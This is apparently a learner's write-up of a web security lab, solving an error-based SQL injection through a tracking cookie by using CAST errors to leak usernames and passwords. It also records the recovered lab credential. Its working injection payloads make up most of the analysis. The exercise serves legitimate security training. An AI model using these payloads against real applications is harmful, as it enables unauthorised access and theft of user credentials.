This lab contains a SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie. The results of the SQL query are not returned.

The database contains a different table called `users`, with columns called `username` and `password`. To solve the lab, find a way to leak the password for the `administrator` user, then log in to their account.

---

**Goal:** Exploit vulnerable tracking cookie. Leak administrator password, then login as the user. 

**Analysis:**

`select trackingId from trackingIdTable where trackingId='pFNjoVuG3fnTFJ3a''`

SELECT * FROM tracking WHERE id = 'pFNjoVuG3fnTFJ3a'--'. Expected  char


CAST()
_Enables you to convert one data type to another._

`pFNjoVuG3fnTFJ3a' AND CAST((SELECT 1) as int)--`

```php
' AND CAST((SELECT 1) as int)--
```

```php
' AND 1=CAST((SELECT username from users LIMIT 1) as int)--
```

```php
' AND 1=CAST((SELECT password from users LIMIT 1) as int)--
```

I had to remove the tracking cookie completely and just use the payload for it to work.

![[Pasted image 20240903081734.png]]

administrator:3y8qs5dd8k66nxeg8u0x

![[Pasted image 20240903081846.png]]

---

**Completed:** _08:19 2024-09-03_

